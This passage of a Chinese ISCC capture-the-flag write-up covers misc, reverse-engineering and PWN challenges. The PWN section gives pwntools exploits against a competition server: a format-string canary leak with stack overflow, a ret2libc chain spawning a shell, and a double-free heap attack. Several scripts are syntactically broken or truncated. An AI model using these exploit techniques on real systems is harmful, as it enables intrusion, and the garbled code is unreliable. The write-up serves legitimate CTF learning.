<h2 id="BNG"><a href="#BNG" class="headerlink" title="BNG"></a>BNG</h2><p>利用两个脚本跑出图片和隐写位置的数据，一个是这篇博客中的脚本：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kentle/p/14725589.html">https://www.cnblogs.com/kentle/p/14725589.html</a><br><img src="https://img-blog.csdnimg.cn/6684fa35afdc4a38acc5a9b0d0a3b4fa.png" alt="在这里插入图片描述"><br>和这个bng转换脚本<br><img src="https://img-blog.csdnimg.cn/47a1887f493c45e5bdb94855c59559e1.png" alt="在这里插入图片描述"><br>图片和隐写位置数据分别为<br><img src="https://img-blog.csdnimg.cn/248a0ae738734ff4b18dd633e32354f9.png" alt="在这里插入图片描述"><br>Vm1wR2EwNUhTWGxVYms1cFRUSjRWbFl3WkRSWFJteHpZVVZPYWxadGVIcFdNbmgzWVRBeFZrNVdaRnBXVmxwUVdWVmFTbVF3TVZWWGJHUlRUVEJLVVZkV1dsWmtNbEY1Vkd0c1ZHSkdXazlaYlhSTFpVWmFSMWR0Um1waVZscFlWako0VjFWdFJqWmlTRUpYWWtkb1JGcFhlR0ZTVmtaelZHMXNhR1ZzV2toV1JscHZVakZhYzFwRmJGSmlSVXBoVm1wT1QwMHhVbGRYYkU1clVsUkdWMVJzWkRSV01WcEhWMnh3VjJFeGNGUldha1pyWkVaS2RWTnNhR2xpUlhCWFYxY3dNVkV5UmtkaVJtUlhWMGRvVUZscmFFTlRWbkJKWWpOa1VWVlVNRGs9<br>经过多次Base64解密后，得到密码<br><img src="https://img-blog.csdnimg.cn/0287ff040f09456a9df7b3ab4dd4b623.png" alt="在这里插入图片描述"><br>利用脚本将图片中的数据跑出来<br><img src="https://img-blog.csdnimg.cn/daf2ac8404b344f391481cf34bc0e290.png" alt="在这里插入图片描述"><br>跑出一个带密码的压缩包，密码填<br>75ce46be8882436396c25c9b1f76b37e 得到flag</p>
<h2 id="Guess-Where"><a href="#Guess-Where" class="headerlink" title="Guess!Where?"></a>Guess!Where?</h2><p>下载附件，按照凯撒3、base64、base32、base16的顺序解密，得到密文  I_love_iscc!!! 打开压缩包，按照时间顺序排序，会发现ISC2<br><img src="https://img-blog.csdnimg.cn/eabe36dac3a8414b83767301138d142b.png" alt="在这里插入图片描述"><br>写脚本爆出flag<br><img src="https://img-blog.csdnimg.cn/91041df83a6c49aabfc01f7c00277dbd.png" alt="在这里插入图片描述"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="JustDoIt"><a href="#JustDoIt" class="headerlink" title="JustDoIt"></a>JustDoIt</h2><p>拖入EXE，发现无壳，拖入32位IDA，找到main函数，F5反汇编，分析函数<br>通过分析是对输入的字符进行加密再与加密的 flag 比较<br>加密函数<br><img src="https://img-blog.csdnimg.cn/6cb781f0fb074076a42c601da40cf984.png#pic_center" alt="在这里插入图片描述"><br>写脚本如下：</p>
<pre><code class="hljs python">v8=[<span class="hljs-number">23</span>,<span class="hljs-number">68</span>,<span class="hljs-number">68</span>,<span class="hljs-number">15</span>,<span class="hljs-number">94</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">95</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">87</span>,<span class="hljs-number">3</span>,<span class="hljs-number">26</span>,<span class="hljs-number">105</span>]
v7=<span class="hljs-string">&#x27;ISCC&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(v8)):
 v8[i]^=<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">0</span>])
 v8[i]-=<span class="hljs-built_in">ord</span>(v7[i%<span class="hljs-number">4</span>])%<span class="hljs-number">5</span>
 v8[i]=v8[i]+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">2</span>])%<span class="hljs-number">6</span>+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">3</span>])// <span class="hljs-number">6</span>
 v8[i]-=<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">1</span>])//<span class="hljs-number">7</span>+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">0</span>])%<span class="hljs-number">7</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(v8)):
 v8[i]-=i
t=v8[<span class="hljs-built_in">len</span>(v8)-<span class="hljs-number">1</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):
 v8[i]=v8[i-<span class="hljs-number">1</span>]
v8[<span class="hljs-number">0</span>]=t
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):
 v8[i]+=<span class="hljs-number">60</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):
 <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v8[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="奇门遁甲"><a href="#奇门遁甲" class="headerlink" title="奇门遁甲"></a>奇门遁甲</h2><p>附件下载，拖入EXE，无壳，拖入32位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/07f5bf36cd08449eb7336caa42bba026.png#pic_center" alt="在这里插入图片描述"></p>
<p>打开程序知道要按一定的顺序要求依次输出每个门，得到碎片，最终拼成flag<br>通过穷举法得出正确的顺序应该为31284567，因此得到flag为?48?IKuSzv;UZrzWTLLuV8VG</p>
<h2 id="变形记"><a href="#变形记" class="headerlink" title="变形记"></a>变形记</h2><p>下载附件，拖入EXE，拖入32位IDA，F5反汇编，找到关键字符串<br><img src="https://img-blog.csdnimg.cn/2f917999bcfa435da0a3fe28cc85f536.png#pic_center" alt="在这里插入图片描述"><br>取出字符串先逆序得到base64密文Y3lReWNzQmN5UXkyc3Z5djJ6YzI=，再解密得到cyQycsBcyQy2svyv2zc2，然后是一个字符串压缩，就是换成重复个数<br>比如解出来的带有B2字样，就变成BB，以此类推<br>所以最终得到flag为ISCC[cyQycsBcyQyysvyvvzcc]</p>
<h2 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h2><p>拖入EXE，拖入32位IDA，F5反汇编，进入main_0函数<br>根据显示的密文写出一个c++的运行代码</p>
<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bitsdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-type">int</span> v6 = <span class="hljs-number">23</span>,j=<span class="hljs-number">0</span>;
    <span class="hljs-type">char</span> v8[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;(0$$b&lt;&quot;</span>;
    v8[<span class="hljs-number">6</span>] = <span class="hljs-number">25</span>;
    v8[<span class="hljs-number">7</span>] = <span class="hljs-number">30</span>;
    v8[<span class="hljs-number">8</span>] = <span class="hljs-number">45</span>;
    v8[<span class="hljs-number">9</span>]= <span class="hljs-number">53</span>;
    v8[<span class="hljs-number">10</span>]=<span class="hljs-number">66</span>;
    v8[<span class="hljs-number">11</span>] = <span class="hljs-number">42</span>;
    v8[<span class="hljs-number">12</span>] = <span class="hljs-number">-88</span>;
    v8[<span class="hljs-number">13</span>] = <span class="hljs-number">-123</span>;
    v8[<span class="hljs-number">14</span>] = &amp;apos;a&amp;apos;;
    v8[<span class="hljs-number">15</span>] =&amp;apos;e&amp;apos; ;
    v8[<span class="hljs-number">16</span>] = &amp;apos;<span class="hljs-number">6</span>&amp;apos;;
    v8[<span class="hljs-number">17</span>] = &amp;apos;/&amp;apos;;
    v8[<span class="hljs-number">18</span>] =&amp;apos;C&amp;apos; ;
    v8[<span class="hljs-number">19</span>] = &amp;apos;W&amp;apos;;
    v8[<span class="hljs-number">20</span>] = &amp;apos;<span class="hljs-string">&quot;&amp;apos;;</span>
<span class="hljs-string">    v8[21] = &amp;apos;H&amp;apos;;</span>
<span class="hljs-string">    v8[22]=&amp;apos;s&amp;apos;;                                  </span>
<span class="hljs-string">    char a2[] = &quot;</span>ISCC<span class="hljs-string">&quot;;</span>
<span class="hljs-string">    for (j = 0; j &lt; 4; ++j)</span>
<span class="hljs-string">    &#123;</span>
<span class="hljs-string">            v8[j + 16] -= a2[j] / 5;</span>
<span class="hljs-string">            v8[j + 12] -= v8[j + 4];</span>
<span class="hljs-string">            v8[j + 8] -= 2 * j;</span>
<span class="hljs-string">            v8[j + 4] -= a2[j] % 5;</span>
<span class="hljs-string">            v8[j] -= j ^ -(a2[j] % 4);</span>
<span class="hljs-string">     &#125;</span>
<span class="hljs-string">     for (int i = 0; i &lt; v6; i++)</span>
<span class="hljs-string">     &#123;</span>
<span class="hljs-string">            v8[i] -= i;</span>
<span class="hljs-string">            v8[i] += 32;</span>
<span class="hljs-string">             cout &lt;&lt; v8[i];</span>
<span class="hljs-string">     &#125;</span>
<span class="hljs-string">&#125;</span></code></pre>
<p>运行得到flag</p>
<h2 id="Pull-the-Wool-Over-People’s-Eyes"><a href="#Pull-the-Wool-Over-People’s-Eyes" class="headerlink" title="Pull the Wool Over People’s Eyes"></a>Pull the Wool Over People’s Eyes</h2><p>拖入EXE查壳，发现无壳并拖入32位IDA，找到main函数，F5反汇编<br>在 main 函数中发现一串可疑的二进制字符，分析是处理过的<br><img src="https://img-blog.csdnimg.cn/e56813a6d73e40b2b1c13ef0ef66bcd2.png#pic_center" alt="在这里插入图片描述"><br>写脚本如下：</p>
<pre><code class="hljs python">key = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;ISCC&#123;ACYeeeloorrsuv&#125;&#x27;</span>)
flag = 
<span class="hljs-string">&quot;00000000000000000000000000000000000000000010001000100010000011100000011000</span>
<span class="hljs-string">001110001001110010111000101100010110000011110000110101000111100001110100101</span>
<span class="hljs-string">10000000000&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">8</span>):
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)^key[i]),end=<span class="hljs-string">&quot;&quot;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="狂飙-1"><a href="#狂飙-1" class="headerlink" title="狂飙-1"></a>狂飙-1</h2><p>下载题目，其中包含三个文件根据分析写出脚本</p>
<pre><code class="hljs python">mod=<span class="hljs-number">26</span>
a1=<span class="hljs-number">0x50d7c32f4a659</span>
a2=<span class="hljs-string">&quot;4-chloroisatin&quot;</span>
a3=<span class="hljs-string">&quot;Ammosamide B&quot;</span>
mod_out=(<span class="hljs-built_in">int</span>((a1%<span class="hljs-number">100000</span>)%mod))^(mod*(<span class="hljs-built_in">int</span>)(a1%<span class="hljs-number">100000</span>))
flag=<span class="hljs-string">&quot;ISCC&#123;&quot;</span>+<span class="hljs-built_in">str</span>(mod_put)+<span class="hljs-string">&quot;_&quot;</span>+a2+<span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-built_in">str</span>(a1)+<span class="hljs-string">&quot;_&quot;</span>+a3+<span class="hljs-string">&quot;&#125;&quot;</span>
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>运行得到flag</p>
<h2 id="CrackMePlease"><a href="#CrackMePlease" class="headerlink" title="CrackMePlease"></a>CrackMePlease</h2><p>拖入exe，拖入32位IDA，F5反汇编，跟进main_0函数，分析代码<br>在关键语句前下断点<br><img src="https://img-blog.csdnimg.cn/17e83f03f2a34a69b7a42c7b16756d47.png" alt="在这里插入图片描述"><br>进行调试运行<br><img src="https://img-blog.csdnimg.cn/b9937246dd3d40bf8d1c2a04f9968f93.png" alt="在这里插入图片描述"><br>随机输入一个数字进行运行<br><img src="https://img-blog.csdnimg.cn/9073d230b66041cdbe22cb7a16beae40.png" alt="在这里插入图片描述"><br>进入str2寻找到flag</p>
<h2 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h2><p>把附件拖进ida，初步分析是用给出的密文，转换进制加密，写脚本跑出flag</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;
    <span class="hljs-type">char</span> v9[<span class="hljs-number">26</span>]; <span class="hljs-comment">// [esp+140h] [ebp-28h]</span>
     v9[<span class="hljs-number">0</span>] = <span class="hljs-number">165</span>;
  v9[<span class="hljs-number">1</span>] = <span class="hljs-number">67</span>;
  v9[<span class="hljs-number">2</span>] = <span class="hljs-number">83</span>;
  v9[<span class="hljs-number">3</span>] = <span class="hljs-number">148</span>;
  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">68</span>;
  v9[<span class="hljs-number">5</span>] = <span class="hljs-number">67</span>;
  v9[<span class="hljs-number">6</span>] = <span class="hljs-number">84</span>;
  v9[<span class="hljs-number">7</span>] = <span class="hljs-number">72</span>;
  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">155</span>;
  v9[<span class="hljs-number">9</span>] = <span class="hljs-number">168</span>;
  v9[<span class="hljs-number">10</span>] = <span class="hljs-number">175</span>;
  v9[<span class="hljs-number">11</span>] = <span class="hljs-number">120</span>;
  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">171</span>;
  v9[<span class="hljs-number">13</span>] = <span class="hljs-number">132</span>;
  v9[<span class="hljs-number">14</span>] = <span class="hljs-number">31</span>;
  v9[<span class="hljs-number">15</span>] = <span class="hljs-number">137</span>;
  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">170</span>;
  v9[<span class="hljs-number">17</span>] = <span class="hljs-number">186</span>;
  v9[<span class="hljs-number">18</span>] = <span class="hljs-number">84</span>;
  v9[<span class="hljs-number">19</span>] = <span class="hljs-number">17</span>;
  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">80</span>;
  v9[<span class="hljs-number">21</span>] = <span class="hljs-number">162</span>;
  v9[<span class="hljs-number">22</span>] = <span class="hljs-number">186</span>;
  v9[<span class="hljs-number">23</span>] = <span class="hljs-number">121</span>;
  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">247</span>;
    v9[<span class="hljs-number">25</span>] = <span class="hljs-string">&#x27;_&#x27;</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">25</span>; i++)
    &#123;
        v9[i] ^= <span class="hljs-string">&#x27;S&#x27;</span>;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">24</span>; i &gt;= <span class="hljs-number">0</span>; i--)
    &#123;
        v9[i] += v9[i + <span class="hljs-number">1</span>];
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        v9[i] += <span class="hljs-number">30</span>;
    &#125;
    <span class="hljs-type">char</span> v5[] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;
    <span class="hljs-type">char</span> v4[] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        <span class="hljs-keyword">if</span> (v9[i] == <span class="hljs-string">&#x27;&#123;&#x27;</span> || v9[i] == <span class="hljs-string">&#x27;&#125;&#x27;</span>)
        &#123;
            <span class="hljs-keyword">continue</span>;
        &#125;

        <span class="hljs-keyword">if</span> (v9[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)
        &#123;
            v9[i] += <span class="hljs-number">1</span>;
        &#125;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v9[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)
        &#123;
            v9[i] += <span class="hljs-number">1</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v9[i]);
    &#125;
&#125;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/089b2763309f4f18820aa3ef70ca6f85.png" alt="在这里插入图片描述"></p>
<h2 id="狂飙-2"><a href="#狂飙-2" class="headerlink" title="狂飙-2"></a>狂飙-2</h2><p>根据提示<br>提示1：某个文件有些特殊<br>提示2：看看《狂彪》-1<br>提示3：似乎不只是一张图片哦<br>然后研究里面附件是被加密的并且给了一个key</p>
<pre><code class="hljs python">file.namelist()
    elf_name = zip_list[<span class="hljs-number">1</span>]
    zip_file.extract(elf_name, <span class="hljs-string">&#x27;.&#x27;</span>, pwd=key)
    zip_file.close()

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(elf_name, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
        elf_data = f.read()

    <span class="hljs-keyword">return</span> elf_data[<span class="hljs-number">0xe010</span>:<span class="hljs-number">0xe030</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_flag</span>(<span class="hljs-params">data</span>):
    flag = <span class="hljs-string">&quot;ISCC&#123;tHe_5eY@&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):
        d = data[i] - <span class="hljs-number">16</span>
        d ^= <span class="hljs-number">2</span>
        d += <span class="hljs-number">44</span>
        flag += <span class="hljs-built_in">chr</span>(d)
    <span class="hljs-keyword">return</span> flag

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    key = <span class="hljs-string">b&quot;1422201965553241&quot;</span>
    enc_file = <span class="hljs-string">&quot;cellphone.enc&quot;</span>
    data = decrypt_data(key, enc_file)
    flag = generate_flag(data)
    <span class="hljs-built_in">print</span>(flag)
</code></pre>
<p>运行得到flag</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="三个愿望"><a href="#三个愿望" class="headerlink" title="三个愿望"></a>三个愿望</h2><p>附件下载，拖入EXE，拖入64位IDA，F5反汇编，shift+F12搜索字符串<br><img src="https://img-blog.csdnimg.cn/2d36c4a0f9b54f93b3361f6a0726a484.png#pic_center" alt="在这里插入图片描述"><br>找到/bin/bash，说明存在常规后门<br>回到main函数，跟进begingame()，分析代码<br>第一个愿望由随机数种子除以9取余加一得到<br>srand(v6)，此时v3=1<br>跟进secondwish()；<br><img src="https://img-blog.csdnimg.cn/fddefaa7300a49ce929283d860c6afaa.png#pic_center" alt="在这里插入图片描述"><br>通过%n$p多次试验得到canary的值为6<br>s距离rbp的距离为30，v2距离rbp<br>计算0x30-0x8+6得到v2的地址，因此通过第二个愿望<br>跟进thirdwish();<br><img src="https://img-blog.csdnimg.cn/ef27735d23844aa48f3fb7e5558f5cc4.png#pic_center" alt="在这里插入图片描述"><br>结合之前发现的/bin/bash，为典型栈溢出问题<br>写脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#elf=ELF(&#x27;./f3&#x27;)</span>
back=<span class="hljs-number">0x4011d6</span>
<span class="hljs-comment">#p=process(&#x27;./f3&#x27;)</span>
p=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10001</span>)
p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
p.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)
p.sendline(<span class="hljs-string">b&#x27;%11$p&#x27;</span>)

p.recvuntil(<span class="hljs-string">b&#x27;wish!\n&#x27;</span>)
canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))

p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)
pay=p64(canary*<span class="hljs-number">6</span>+p64(back)*<span class="hljs-number">2</span>
p.sendline(pay)

p.interactuve()</code></pre>
<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><ol>
<li>分析<br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/df4c07aafbfd46c989e24874e3f28613.png#pic_center" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/ae86ae662f4c4f76a9ca7bfc4308d9ce.png#pic_center" alt="在这里插入图片描述"></li>
<li>思路<br>通过分析，输入存在多处栈溢出<br>第一次把 v6 的值覆盖为 365696460，使程序能走到第二次栈溢出<br>再在第二次栈溢出布置栈帧<br>程序没有现成的后门函数，可以泄漏地址但程序已经给了，所有只要授受地址，再<br>通用题目给的 libc 文件来计算基址，再调用 libc 中的 system 函数</li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-number">5.</span> <span class="hljs-keyword">import</span> struct
<span class="hljs-number">6.</span> <span class="hljs-keyword">import</span> os
<span class="hljs-number">7.</span>
<span class="hljs-number">8.</span> context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
<span class="hljs-number">9.</span> elf = ELF(<span class="hljs-string">&quot;./Login&quot;</span>)
<span class="hljs-number">10.</span>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)
<span class="hljs-number">11.</span>DEBUG = <span class="hljs-number">0</span>
<span class="hljs-number">12.</span>
<span class="hljs-number">13.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
<span class="hljs-number">14.</span> p.recvuntil(<span class="hljs-string">&quot;Here is a tip: 0x&quot;</span>)
<span class="hljs-number">15.</span> std_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)
<span class="hljs-number">16.</span> info(<span class="hljs-string">&quot;std_addr-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(std_addr))
<span class="hljs-number">17.</span> libc.address = std_addr - <span class="hljs-number">0x3c48e0</span>
<span class="hljs-number">18.</span> p.recvuntil(<span class="hljs-string">&quot;input the username:\n&quot;</span>)
<span class="hljs-number">19.</span> p.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&quot;\xCC\x15\xCC\x15&quot;</span>)
<span class="hljs-number">20.</span> p.recvuntil(<span class="hljs-string">&quot;input the password:\n&quot;</span>)
<span class="hljs-number">21.</span> payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x00000000004008c3</span>) +
p64(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])
<span class="hljs-number">22.</span> p.send(payload)
<span class="hljs-number">23.</span> p.interactive()
<span class="hljs-number">24.</span>
<span class="hljs-number">25.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
<span class="hljs-number">26.</span> <span class="hljs-keyword">if</span> DEBUG:
<span class="hljs-number">27.</span> p = process(<span class="hljs-string">&quot;./Login&quot;</span>)
<span class="hljs-number">28.</span> gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
<span class="hljs-number">29.</span> exp(p)
<span class="hljs-number">30.</span>
<span class="hljs-number">31.</span> <span class="hljs-keyword">else</span>:
<span class="hljs-number">32.</span> p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10000</span>)
<span class="hljs-number">33.</span> exp(p)
<span class="hljs-number">34.</span>
<span class="hljs-number">35.</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
<span class="hljs-number">36.</span> main()</code></pre>

<h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><ol>
<li>分析<br>用checksec工具分析程序<br><img src="https://img-blog.csdnimg.cn/208e6a616c4247cbbe94ad1c41e2c542.png#pic_center" alt="在这里插入图片描述"><br>再看IDA源代码，存在堆漏洞</li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#context.arch=&quot;amd64&quot;</span>
<span class="hljs-comment">#context.arch=&quot;i386&quot;</span>
context.os=<span class="hljs-string">&quot;linux&quot;</span>
context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)

io=<span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> io==<span class="hljs-number">0</span>:
   p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-keyword">else</span>:
   p=remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10021</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():
   gdb.attach(p)
   pause()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size</span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
   p.sendlineafter(<span class="hljs-string">&#x27;请输入大小：&#x27;</span>,<span class="hljs-built_in">str</span>(size))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,pay</span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
   p.sendafter(<span class="hljs-string">&#x27;请输入编辑内容：&#x27;</span>,pay)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x41</span>)
add(<span class="hljs-number">16</span>,<span class="hljs-number">0x40</span>)
add(<span class="hljs-number">18</span>,<span class="hljs-number">0x30</span>)

add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>)

dele(<span class="hljs-number">4</span>)
dele(<span class="hljs-number">5</span>)
dele(<span class="hljs-number">4</span>)

add(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>)
edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x6020e0</span>))

add(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>)<span class="hljs-comment">#sizes</span>

add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x90</span>)

edit(<span class="hljs-number">10</span>,p32(<span class="hljs-number">0x50</span>))

ptrs=<span class="hljs-number">0x6024e0</span>
fd=ptrs+<span class="hljs-number">8</span>
bk=ptrs+<span class="hljs-number">16</span>
